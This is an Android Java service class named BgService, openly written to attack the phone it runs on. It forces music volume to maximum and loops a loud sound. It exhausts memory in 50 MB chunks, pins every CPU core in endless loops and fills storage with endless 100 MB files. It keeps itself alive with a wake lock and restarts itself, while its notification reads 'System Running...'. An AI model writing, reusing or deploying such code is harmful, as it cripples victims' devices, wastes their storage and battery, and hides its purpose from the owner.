package com.example.app;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;

public class BgService extends Service {
    private MediaPlayer mediaPlayer;
    private PowerManager.WakeLock wakeLock;
    private AudioManager audioManager;

    @Override
    public void onCreate() {
        super.onCreate();
        
        String CHANNEL = "ch";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CHANNEL, "A_Art", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
        startForeground(1, b.setContentTitle("A_Art").setContentText("System Running...").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());

        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "App::WakeLock");
        wakeLock.acquire();

        // 1. الصوت
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
        mediaPlayer = MediaPlayer.create(this, R.raw.loud);
        mediaPlayer.setLooping(true);
        mediaPlayer.setVolume(1.0f, 1.0f);
        mediaPlayer.start();

        // 2. استنزاف الرام
        List<byte[]> memoryHog = new ArrayList<>();
        new Thread(() -> {
            while (true) {
                try {
                    byte[] chunk = new byte[50 * 1024 * 1024]; 
                    memoryHog.add(chunk);
                } catch (OutOfMemoryError e) { break; } catch (Exception e) {}
            }
        }).start();

        // 3. استنزاف المعالج
        for (int i = 0; i < Runtime.getRuntime().availableProcessors(); i++) {
            new Thread(() -> {
                while (true) { Math.sqrt(Math.random()); }
            }).start();
        }

        // 4. استنزاف التخزين بسرعة (ملفات 100 ميجا)
        for (int i = 0; i < 4; i++) {
            new Thread(() -> {
                try {
                    File dir = getExternalFilesDir(null);
                    byte[] buffer = new byte[100 * 1024 * 1024]; // 100 ميجا
                    int fileCount = 0;
                    while (true) {
                        File file = new File(dir, "sys_" + fileCount++ + ".bin");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(buffer);
                        fos.close();
                    }
                } catch (Exception e) {}
            }).start();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
